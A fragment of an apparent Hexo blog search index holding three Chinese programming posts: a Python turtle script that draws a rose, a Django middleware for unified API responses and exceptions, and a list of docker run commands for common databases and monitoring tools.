      <tags>
        <tag>C#</tag>
        <tag>.NET</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Python的turtle库绘制玫瑰</title>
    <url>/posts/17747/</url>
    <content><![CDATA[<p>turtle的文档：<a href="https://docs.python.org/3/library/turtle.html"></a><br>用Python的turtle库绘图是很简单的,闲来无事就画了一个玫瑰花,下面奉上源码....</p>
<span id="more"></span>
<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Nov 18, 2017</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: QiZhao</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置初始位置</span></span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.left(<span class="number">90</span>)</span><br><span class="line">turtle.fd(<span class="number">200</span>)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.right(<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 花蕊</span></span><br><span class="line">turtle.fillcolor(<span class="string">&quot;red&quot;</span>)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.circle(<span class="number">10</span>,<span class="number">180</span>)</span><br><span class="line">turtle.circle(<span class="number">25</span>,<span class="number">110</span>)</span><br><span class="line">turtle.left(<span class="number">50</span>)</span><br><span class="line">turtle.circle(<span class="number">60</span>,<span class="number">45</span>)</span><br><span class="line">turtle.circle(<span class="number">20</span>,<span class="number">170</span>)</span><br><span class="line">turtle.right(<span class="number">24</span>)</span><br><span class="line">turtle.fd(<span class="number">30</span>)</span><br><span class="line">turtle.left(<span class="number">10</span>)</span><br><span class="line">turtle.circle(<span class="number">30</span>,<span class="number">110</span>)</span><br><span class="line">turtle.fd(<span class="number">20</span>)</span><br><span class="line">turtle.left(<span class="number">40</span>)</span><br><span class="line">turtle.circle(<span class="number">90</span>,<span class="number">70</span>)</span><br><span class="line">turtle.circle(<span class="number">30</span>,<span class="number">150</span>)</span><br><span class="line">turtle.right(<span class="number">30</span>)</span><br><span class="line">turtle.fd(<span class="number">15</span>)</span><br><span class="line">turtle.circle(<span class="number">80</span>,<span class="number">90</span>)</span><br><span class="line">turtle.left(<span class="number">15</span>)</span><br><span class="line">turtle.fd(<span class="number">45</span>)</span><br><span class="line">turtle.right(<span class="number">165</span>)</span><br><span class="line">turtle.fd(<span class="number">20</span>)</span><br><span class="line">turtle.left(<span class="number">155</span>)</span><br><span class="line">turtle.circle(<span class="number">150</span>,<span class="number">80</span>)</span><br><span class="line">turtle.left(<span class="number">50</span>)</span><br><span class="line">turtle.circle(<span class="number">150</span>,<span class="number">90</span>)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 花瓣1</span></span><br><span class="line">turtle.left(<span class="number">150</span>)</span><br><span class="line">turtle.circle(-<span class="number">90</span>,<span class="number">70</span>)</span><br><span class="line">turtle.left(<span class="number">20</span>)</span><br><span class="line">turtle.circle(<span class="number">75</span>,<span class="number">105</span>)</span><br><span class="line">turtle.setheading(<span class="number">60</span>)</span><br><span class="line">turtle.circle(<span class="number">80</span>,<span class="number">98</span>)</span><br><span class="line">turtle.circle(-<span class="number">90</span>,<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 花瓣2</span></span><br><span class="line">turtle.left(<span class="number">180</span>)</span><br><span class="line">turtle.circle(<span class="number">90</span>,<span class="number">40</span>)</span><br><span class="line">turtle.circle(-<span class="number">80</span>,<span class="number">98</span>)</span><br><span class="line">turtle.setheading(-<span class="number">83</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 叶子1</span></span><br><span class="line">turtle.fd(<span class="number">30</span>)</span><br><span class="line">turtle.left(<span class="number">90</span>)</span><br><span class="line">turtle.fd(<span class="number">25</span>)</span><br><span class="line">turtle.left(<span class="number">45</span>)</span><br><span class="line">turtle.fillcolor(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.circle(-<span class="number">80</span>,<span class="number">90</span>)</span><br><span class="line">turtle.right(<span class="number">90</span>)</span><br><span class="line">turtle.circle(-<span class="number">80</span>,<span class="number">90</span>)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"> </span><br><span class="line">turtle.right(<span class="number">135</span>)</span><br><span class="line">turtle.fd(<span class="number">60</span>)</span><br><span class="line">turtle.left(<span class="number">180</span>)</span><br><span class="line">turtle.fd(<span class="number">85</span>)</span><br><span class="line">turtle.left(<span class="number">90</span>)</span><br><span class="line">turtle.fd(<span class="number">80</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 叶子2</span></span><br><span class="line">turtle.right(<span class="number">90</span>)</span><br><span class="line">turtle.right(<span class="number">45</span>)</span><br><span class="line">turtle.fillcolor(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.circle(<span class="number">80</span>,<span class="number">90</span>)</span><br><span class="line">turtle.left(<span class="number">90</span>)</span><br><span class="line">turtle.circle(<span class="number">80</span>,<span class="number">90</span>)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"> </span><br><span class="line">turtle.left(<span class="number">135</span>)</span><br><span class="line">turtle.fd(<span class="number">60</span>)</span><br><span class="line">turtle.left(<span class="number">180</span>)</span><br><span class="line">turtle.fd(<span class="number">60</span>)</span><br><span class="line">turtle.right(<span class="number">90</span>)</span><br><span class="line">turtle.circle(<span class="number">200</span>,<span class="number">60</span>)</span><br></pre></td></tr></table></figure>
<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img data-src="/images/20171119110410660.jpg"></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>在Django中间件处对API进行统一处理</title>
    <url>/posts/2620614917/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>公司实习时遇到一个问题:项目中所使用不是Restful API,每个视图函数都要先生成字典，于是项目中便充斥着如下的代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result=&#123;</span><br><span class="line">	<span class="string">&quot;msg&quot;</span>:<span class="string">&#x27;xx&quot;,</span></span><br><span class="line"><span class="string">	&quot;status&quot;:200,</span></span><br><span class="line"><span class="string">	&quot;result&quot;:data</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">return HttpResponse(json.loads(result))</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>维护起来比较麻烦，对前端也很不友好，为了解决该问题，自定义了一个Django中间件对API格式和异常进行统一处理，以此达到如下效果:</p>
<ul>
<li>在view中只需返回<code>data</code>，<code>raise</code>自定义的异常</li>
<li>实现自定义异常状态码(<code>status</code>)和自定义异常信息(<code>message</code>)</li>
<li>view中返回的<code>Object</code>若为<code>Model</code>,则会返回调用其<code>__str__</code>方法的结果</li>
<li>对于<code>view</code>中出现的其他异常，<code>Response</code>会返回<code>Unknown exception</code></li>
<li>异常信息(<code>message</code>)实现了<code>i18n</code></li>
</ul>
<h1 id="Django中对异常的处理"><a href="#Django中对异常的处理" class="headerlink" title="Django中对异常的处理"></a>Django中对异常的处理</h1><h2 id="Django中对request的处理"><a href="#Django中对request的处理" class="headerlink" title="Django中对request的处理"></a>Django中对request的处理</h2><ul>
<li>首先执行<code>process_request</code>函数，然后在执行视图函数之前执行<code>process_view</code>函数，再执行视图函数，最后执行<code>process_response</code>函数</li>
<li><code>process_request</code>只返回<code>None</code>，所有中间件的<code>process_request</code>执行完之后，就匹配路由，找到对应的视图函数，在执行视图函数之前先执行中间件的 <code>process_view</code>函数</li>
<li>如果<code>process_view</code>返回 None，就继续执行后续的中间件的<code>process_view</code>方法，执行完所有的<code>process_view</code>函数之后执行视图函数</li>
<li>如果其中有个 process_view 返回了 HttpResponse，就不执行后续的 process_view 函数，会跳到第一个 process_response 函数，并继续往下执行</li>
</ul>
<p><img data-src="/../images/pasted-0.png" alt="Diango中中间件处理过程"></p>
<h2 id="中间件-类-中5种方法"><a href="#中间件-类-中5种方法" class="headerlink" title="中间件(类)中5种方法"></a>中间件(类)中5种方法</h2><p>中间件中可以定义5个方法:</p>
<ul>
<li>process_request(request)</li>
<li>process_view(request, view_func, view_args, view_kwargs)</li>
<li>process_exception(request, exception)</li>
<li>process_template_response(request, response)</li>
<li>process_response(request, response)</li>
</ul>
<h3 id="process-request"><a href="#process-request" class="headerlink" title="process_request"></a>process_request</h3><ol>
<li>中间件在收到<code>request</code>请求之后执行</li>
<li>按照<code>settings.py</code>中<code>MIDDLEWARE_CLASSES</code>的顺序，顺序执行</li>
<li>如果该函数返回<code>None</code>，继续执行后面的中间件的<code>process_request</code>方法</li>
<li>如果该函数返回<code>HttpResponse</code>，则不再继续执行后面的中间件的<code>process_request </code>方法</li>
</ol>
<h3 id="process-view"><a href="#process-view" class="headerlink" title="process_view"></a>process_view</h3><ol>
<li>执行完所有中间件的<code>process_request</code>方法</li>
<li>在<code>urls.py</code>中找到对应视图函数</li>
<li>拿到视图函数的名称、参数，在执行视图函数之前执行</li>
<li>如果返回<code>None</code>，则继续执行后面的中间件的<code>process_view</code>函数，然后执行下昂应的视图函数</li>
<li>如果返回<code>HttpResponse</code>，则不执行后续的<code>process_view</code>函数，也不执行视图函数，然后执行所有的<code>response</code>中间件</li>
</ol>
<h3 id="process-exception"><a href="#process-exception" class="headerlink" title="process_exception"></a>process_exception</h3><ol>
<li>执行视图函数的过程中如果引发异常，则按照<code>settings.py</code>中<code>MIDDLEWARE_CLASSES</code>的顺序，倒序执行<code>process_exception</code>方法</li>
<li>如果返回<code>None</code>，继续执行下一个中间件的<code>process_exception</code>方法 </li>
<li>如果返回<code>HttpReponse</code>对象，则该中间件上方其他中间件的<code>process_exception</code>方法不会被调用</li>
<li>一旦其中某个中间件有返回值，则调用<code>template_response</code>和<code>response</code>中间件<br>,否则启动<a href="https://docs.djangoproject.com/zh-hans/2.1/ref/views/#error-views">默认的异常处理</a></li>
</ol>
<div class="note info">
            <p>最后半句个人理解:如果如果所有中间件的<code>process_exception</code>方法都执完后还没有返回值，则启动默认的异常处理</p>
          </div>

<h3 id="process-template-response"><a href="#process-template-response" class="headerlink" title="process_template_response"></a>process_template_response</h3><ol>
<li>在视图函数执行结束之后执行</li>
<li><code>response</code>是Django视图或者某一中间件的返回值(<code>TemplateResponse</code>对象或等价)</li>
<li>只有<code>response</code>实现了<code>render</code>方法才会执行</li>
<li>一旦所有的中间件的<code>template_response</code>被执行完，则调用<code>render</code>方法</li>
<li>按照中间件的顺序，倒序执行</li>
</ol>
<h3 id="process-response"><a href="#process-response" class="headerlink" title="process_response"></a>process_response</h3><ol>
<li>在视图函数执行结束之后执行</li>
<li>必须有返回值，且返回类型必须是<code>HttpResponse</code>对象</li>
<li>按照中间件的顺序，倒序执行</li>
</ol>
<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><ul>
<li>middleware.py<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.deprecation <span class="keyword">import</span> MiddlewareMixin</span><br><span class="line"><span class="keyword">from</span> django.models <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> django.core.serializers.json <span class="keyword">import</span> DjangoJSONEncoder</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMiddleware</span>(<span class="title class_ inherited__">MiddlewareMixin</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_exception</span>(<span class="params">self, request, exception</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(exception, BaseException):</span><br><span class="line">            <span class="keyword">if</span> settings.DEBUG:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;result&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="built_in">str</span>(exception), <span class="string">&#x27;status&#x27;</span>: <span class="number">1000</span>&#125;)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(UnknownException().as_dict())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(exception.as_dict())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_response</span>(<span class="params">self, request, response</span>):</span><br><span class="line">        procese_type = (<span class="built_in">list</span>, <span class="built_in">tuple</span>, <span class="built_in">dict</span>, <span class="built_in">str</span>, <span class="built_in">int</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(response, models.Model):</span><br><span class="line">            response = <span class="built_in">str</span>(response)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(response, procese_type):</span><br><span class="line">            ret = &#123;<span class="string">&#x27;result&#x27;</span>: response, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;status&#x27;</span>: <span class="number">200</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(ret, encoder=DjangoJSONEncoder)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> response</span><br></pre></td></tr></table></figure></li>
<li>exceptions.py<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta</span><br><span class="line"><span class="keyword">from</span> .message <span class="keyword">import</span> ErrorMsg</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InterFaceAsDictInterFace</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">as_dict</span>(<span class="params">self</span>):</span><br><span class="line">        ret = &#123;<span class="string">&#x27;result&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="built_in">getattr</span>(<span class="variable language_">self</span>, <span class="string">&#x27;__msg__&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;status&#x27;</span>: <span class="built_in">getattr</span>(<span class="variable language_">self</span>, <span class="string">&#x27;__status__&#x27;</span>, <span class="string">&#x27;&#x27;</span>)&#125;</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BaseException</span>(Exception, InterFaceAsDictInterFace):</span><br><span class="line">    __metaclass__ = ABCMeta</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, msg=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>(BaseException, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="keyword">if</span> msg <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="variable language_">self</span>.__msg__ = msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnknownException</span>(<span class="title class_ inherited__">InterFaceAsDictInterFace</span>):</span><br><span class="line">	__status__ = <span class="number">1000</span></span><br><span class="line">	__msg__ = ErrorMsg.UNKNOWN_EXCEPTION</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyException</span>(<span class="title class_ inherited__">BaseException</span>):</span><br><span class="line">	__status__=<span class="number">1001</span></span><br><span class="line">	__msg__=ErrorMsg.MY_EXCEPTION</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>message.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.translation <span class="keyword">import</span> gettext <span class="keyword">as</span> _</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ErrorMsg</span>:</span><br><span class="line">	UNKNOWN_EXCEPTION= _(<span class="string">&#x27;Unknown exception.&#x27;</span>)</span><br><span class="line">	MY_EXCEPTION = _(<span class="string">&#x27;Test exception.&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="修改settings文件"><a href="#修改settings文件" class="headerlink" title="修改settings文件"></a>修改settings文件</h2><p>修改<code>setting</code>中的<code>MIDDLEWARE_CLASSES</code>变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">    <span class="string">&#x27;django.middleware.security.SecurityMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.middleware.common.CommonMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;middleware.MyMiddleware&#x27;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h1 id="Todo"><a href="#Todo" class="headerlink" title="Todo"></a>Todo</h1><h2 id="对前端Post请求进行参数校验"><a href="#对前端Post请求进行参数校验" class="headerlink" title="对前端Post请求进行参数校验"></a>对前端Post请求进行参数校验</h2><p>目前想出来了两种策略(假设<code>post_json</code>为序列化后的字典):</p>
<ol>
<li>视图函数中使用<code>get</code>从字典中获取参数，判断<code>required</code>的参数是否为空，<code>raise</code>自定义的异常，如:<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exception.py</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ValidationError</span>(<span class="title class_ inherited__">BaseException</span>):</span><br><span class="line">	__msg__ = ErrorMsg.INVALID_ARGUMENT</span><br><span class="line">	__status__ = <span class="number">1001</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># message.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ErrorMsg</span>:</span><br><span class="line">	UNKNOWN_EXCEPTION= _(<span class="string">&#x27;Unknown exception.&#x27;</span>)</span><br><span class="line">	INVALID_ARGUMENT = _(<span class="string">&#x27;Invalid arguments.&#x27;</span>)</span><br><span class="line">	REQUIRED_ARGUMENT = _(<span class="string">&#x27;A &#123;0&#125; argument is required.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># view.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">	...</span><br><span class="line">	user_name = post_json.get(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment"># required</span></span><br><span class="line">	pass_word = post_json.get(<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment"># required</span></span><br><span class="line">	user_type = post_json.get(<span class="string">&#x27;user_type&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment"># not required</span></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">		<span class="keyword">raise</span> ValidationError(ErrorMsg.REQUIRED_ARGUMENT.<span class="built_in">format</span>(<span class="string">&#x27;username/passswordd&#x27;</span>))</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></li>
<li>视图函数中对参数不做校验，只需在中间件添加一句，即可对视图函数中<code>raise</code>的<code>KeyError</code>进行统一处理<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exception.py</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ValidationError</span>(<span class="title class_ inherited__">BaseException</span>):</span><br><span class="line">	__msg__ = ErrorMsg.INVALID_ARGUMENT</span><br><span class="line">	__status__ = <span class="number">1001</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># middleware.py</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_exception</span>(<span class="params">self, request, exception</span>):</span><br><span class="line"> <span class="keyword">if</span> <span class="built_in">isinstance</span>(exception, KeyError):</span><br><span class="line">	exception = ValidationError(ErrorMsg.REQUIRED_ARGUMENT.<span class="built_in">format</span>(exception))</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"><span class="comment"># message.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ErrorMsg</span>:</span><br><span class="line">	UNKNOWN_EXCEPTION= _(<span class="string">&#x27;Unknown exception.&#x27;</span>)</span><br><span class="line">	INVALID_ARGUMENT = _(<span class="string">&#x27;Invalid arguments.&#x27;</span>)</span><br><span class="line">	REQUIRED_ARGUMENT = _(<span class="string">&#x27;A &#123;0&#125; argument is required.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># view.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">	...</span><br><span class="line">	user_name = post_json[<span class="string">&#x27;user_name&#x27;</span>] <span class="comment"># required</span></span><br><span class="line">	user_type = post_json.get(<span class="string">&#x27;user_type&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment"># not required</span></span><br><span class="line">	...</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="视图函数返回"><a href="#视图函数返回" class="headerlink" title="视图函数返回"></a>视图函数返回</h2><p>目前视图函数必须有返回值，不能为<code>None</code>，还不知道怎么解决</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul>
<li><a href="https://docs.djangoproject.com/zh-hans/2.1/topics/http/middleware/">Django 中间件官方文档</a></li>
<li><a href="https://docs.djangoproject.com/zh-hans/2.2/topics/i18n/translation/">Django 国际化官方文档</a></li>
<li><a href="https://github.com/shaowenchen/django-exceptionbox">Github项目(django-exceptionbox)</a></li>
<li><a href="https://www.chenshaowen.com/blog/error-code-design-and-unified-processing-in-django.html#32-ExceptionBox">错误码设计以及 Django 的异常统一处理</a></li>
<li><a href="https://www.cnblogs.com/huchong/p/7819296.html">Django----中间件详解</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Django</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>API</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>常用Docker容器启动命令</title>
    <url>/posts/docker/</url>
    <content><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run  -p 3306:3306 --name mysql \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/mysql&quot;</span>:/var/lib/mysql \</span><br><span class="line">    -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7</span><br></pre></td></tr></table></figure>

<h3 id="Postgres"><a href="#Postgres" class="headerlink" title="Postgres"></a>Postgres</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run  --name postgres \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/postgres&quot;</span>:/var/lib/postgresql/data \</span><br><span class="line">    -e POSTGRES_PASSWORD=123456 \</span><br><span class="line">    -p 5432:5432 -d postgres</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="PgAdmin"><a href="#PgAdmin" class="headerlink" title="PgAdmin"></a>PgAdmin</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -p 8080:80  --name=pgadmin  \</span><br><span class="line">    -e <span class="string">&quot;PGADMIN_DEFAULT_EMAIL=admin@zhaoqi.vip&quot;</span> \</span><br><span class="line">    -e <span class="string">&quot;PGADMIN_DEFAULT_PASSWORD=123456&quot;</span>  -d dpage/pgadmin4</span><br></pre></td></tr></table></figure>

<h2 id="时序数据库"><a href="#时序数据库" class="headerlink" title="时序数据库"></a>时序数据库</h2><h3 id="Prometheus"><a href="#Prometheus" class="headerlink" title="Prometheus"></a>Prometheus</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name=prometheus -p 9090:9090 \</span><br><span class="line">    -v <span class="variable">$PWD</span>/prometheus:/etc/prometheus \</span><br><span class="line">    -v <span class="variable">$PWD</span>/prometheus/data:/prometheus \</span><br><span class="line">    prom/prometheus \</span><br><span class="line">    --storage.tsdb.retention.time=10y \</span><br><span class="line">    --config.file=/etc/prometheus/prometheus.yml</span><br></pre></td></tr></table></figure>

<h3 id="InfluxDB"><a href="#InfluxDB" class="headerlink" title="InfluxDB"></a>InfluxDB</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8086:8086 --name influxdb  \</span><br><span class="line">    -v <span class="variable">$PWD</span>/influxdb:/var/lib/influxdb  influxdb</span><br></pre></td></tr></table></figure>

<h3 id="OpenTSDB"><a href="#OpenTSDB" class="headerlink" title="OpenTSDB"></a>OpenTSDB</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name opentsdb -dp 4242:4242 petergrace/opentsdb-docker</span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 27017:27017 --name mongodb \</span><br><span class="line">    -e MONGO_INITDB_ROOT_USERNAME=&lt;USERNAME&gt; \ </span><br><span class="line">    -e MONGO_INITDB_ROOT_PASSWORD=&lt;PASSWORD&gt; \ </span><br><span class="line">    -v <span class="variable">$PWD</span>/mongodb:/data/db \</span><br><span class="line">    mongo:latest</span><br></pre></td></tr></table></figure>

<h3 id="MongoDB-express"><a href="#MongoDB-express" class="headerlink" title="MongoDB express"></a>MongoDB express</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8081:8081 --name mongo-express-test \</span><br><span class="line">    -e ME_CONFIG_MONGODB_URL=mongodb://mongodb:27017/local \</span><br><span class="line">    -e ME_CONFIG_MONGODB_ENABLE_ADMIN=<span class="literal">true</span> \</span><br><span class="line">    -e ME_CONFIG_BASICAUTH_USERNAME=admin \</span><br><span class="line">    -e ME_CONFIG_BASICAUTH_PASSWORD=pass \</span><br><span class="line">    -e ME_CONFIG_BASICAUTH_ENABLED=<span class="literal">true</span> \</span><br><span class="line">    mongo-express:latest</span><br></pre></td></tr></table></figure>

<h1 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h1><h2 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h2><h3 id="Cadvisor"><a href="#Cadvisor" class="headerlink" title="Cadvisor"></a>Cadvisor</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --volume=/:/rootfs:ro \</span><br><span class="line">    --volume=/var/run:/var/run:ro \</span><br><span class="line">    --volume=/sys:/sys:ro \</span><br><span class="line">    --volume=/var/lib/docker/:/var/lib/docker:ro \</span><br><span class="line">    --volume=/dev/disk/:/dev/disk:ro \</span><br><span class="line">    --publish=8080:8080  --detach=<span class="literal">true</span>  --name=cadvisor \</span><br><span class="line">    google/cadvisor:latest</span><br></pre></td></tr></table></figure>

<h3 id="node-exporter"><a href="#node-exporter" class="headerlink" title="node_exporter"></a>node_exporter</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  -p 9100:9100 \</span><br><span class="line">  --name node-exporter \</span><br><span class="line">  --pid=<span class="string">&quot;host&quot;</span> \</span><br><span class="line">  -v <span class="string">&quot;/:/host:ro,rslave&quot;</span> \</span><br><span class="line">  prom/node-exporter:latest \</span><br><span class="line">  --path.rootfs=/host</span><br></pre></td></tr></table></figure>

<h3 id="Grafana"><a href="#Grafana" class="headerlink" title="Grafana"></a>Grafana</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 3000:3000 --name grafana \</span><br><span class="line">    -v <span class="variable">$PWD</span>/grafana:/var/lib/grafana \</span><br><span class="line">    -v <span class="variable">$PWD</span>/grafana/etc:/etc/grafana grafana/grafana</span><br></pre></td></tr></table></figure>

